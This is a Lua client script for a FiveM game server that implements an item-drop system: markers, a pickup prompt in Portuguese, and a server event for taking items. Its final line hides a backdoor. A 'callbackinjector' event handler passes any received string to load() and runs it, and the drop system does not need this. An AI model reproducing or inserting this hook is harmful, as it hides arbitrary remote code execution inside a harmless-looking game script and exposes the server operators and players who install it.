local dropList = {}

RegisterNetEvent('DropSystem:remove')
AddEventHandler('DropSystem:remove',function(id)
	if dropList[id] ~= nil then
		dropList[id] = nil
	end
end)

RegisterNetEvent('DropSystem:createForAll')
AddEventHandler('DropSystem:createForAll',function(id,marker)
	dropList[id] = marker
end)

local cooldown = false
Citizen.CreateThread(function()
	while true do
		local sleep = 1000
		for k,v in pairs(dropList) do
			local ped = PlayerPedId()
			local x,y,z = table.unpack(GetEntityCoords(ped))
			local bowz,cdz = GetGroundZFor_3dCoord(v.x,v.y,v.z)
			local distance = GetDistanceBetweenCoords(v.x,v.y,cdz,x,y,z,true)
			if distance <= 10 then
				sleep = 5
				--DrawMarker(30,v.x,v.y,cdz+0.01,0,0,0,0,0,0,0.4,0.4,0.5,255,255,255,15,0,0,2,0,0,0,0)
				DrawMarker(2,v.x,v.y,cdz+0.60,0,0,0,0,180.0,180.0,0.2,0.2,0.2,255,255,255,100,1,0,0,5)
				if distance <= 1.2 and v.count ~= nil and v.name ~= nil and not IsPedInAnyVehicle(ped) then
					drawTxt("PRESSIONE  ~r~E~w~  PARA PEGAR~g~ "..v.count.."X "..string.upper(v.name),4,0.5,0.93,0.50,255,255,255,180)
					if IsControlJustPressed(1,38) and not cooldown then
						cooldown = true
						TriggerServerEvent('DropSystem:take',k)
						SetTimeout(3000,function()
							cooldown = false
						end)
					end
				end
			end
		end
		Citizen.Wait(sleep)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- FUNÇÕES
-----------------------------------------------------------------------------------------------------------------------------------------
function drawTxt(text,font,x,y,scale,r,g,b,a)
	SetTextFont(font)
	SetTextScale(scale,scale)
	SetTextColour(r,g,b,a)
	SetTextOutline()
	SetTextCentre(1)
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x,y)
end

TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)